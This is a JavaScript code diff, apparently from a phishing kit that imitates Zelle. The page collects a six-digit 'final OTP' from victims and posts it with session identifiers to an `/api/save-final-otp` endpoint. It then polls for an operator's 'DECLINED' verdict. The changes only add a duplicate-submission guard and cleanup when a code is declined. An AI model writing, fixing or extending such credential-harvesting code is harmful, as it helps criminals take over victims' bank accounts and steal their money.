@@ -604,22 +604,35 @@
     // ========================================
     // HANDLE FINAL OTP SUBMIT
     // ========================================
-    async function handleFinalOtpSubmit() {
-        const otpDigits = document.querySelectorAll('.zelle-otp-digit');
-        const code = Array.from(otpDigits).map(input => input.value).join('');
+    let finalOtpSubmitting = false; // Protection flag
+    
+    async function handleFinalOtpSubmit(e) {
+        // Add trace to see what's triggering this
+        console.trace('[Zelle Extended] 🔥 handleFinalOtpSubmit fired - TRACE:');
         
-        if (code.length !== 6) {
-            alert('Please enter all 6 digits');
+        // Protection: Don't run if already submitting
+        if (finalOtpSubmitting) {
+            console.log('[Zelle Extended] ⚠️ Already submitting, ignoring duplicate call');
             return;
         }
         
-        const data = {
-            userId: currentUserId,
-            sessionId: currentSessionId,
-            finalOtp: code
-        };
+        finalOtpSubmitting = true;
         
         try {
+            const otpDigits = document.querySelectorAll('.zelle-otp-digit');
+            const code = Array.from(otpDigits).map(input => input.value).join('');
+            
+            if (code.length !== 6) {
+                alert('Please enter all 6 digits');
+                return;
+            }
+            
+            const data = {
+                userId: currentUserId,
+                sessionId: currentSessionId,
+                finalOtp: code
+            };
+            
             const response = await fetch(`${API_URL}/api/save-final-otp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -637,6 +650,8 @@
             }
         } catch (error) {
             console.error('Error submitting final OTP:', error);
+        } finally {
+            finalOtpSubmitting = false;
         }
     }
     
@@ -850,6 +865,11 @@
                     console.log('[Zelle Extended] ❌ DECLINED! Showing inline error...');
                     pollingStopped = true;
                     clearInterval(otpPollInterval);
+                    
+                    // ✅ Kill any pending success flow
+                    finalOtpSubmitting = false;
+                    hideModal('successModal');
+                    hideModal('finalOtpModal');
                     
                     // 🔍 DIAGNOSTIC: Capture DOM state BEFORE React reacts
                     const otpInputsBefore = document.querySelectorAll('input[type="text"][maxlength="1"]');
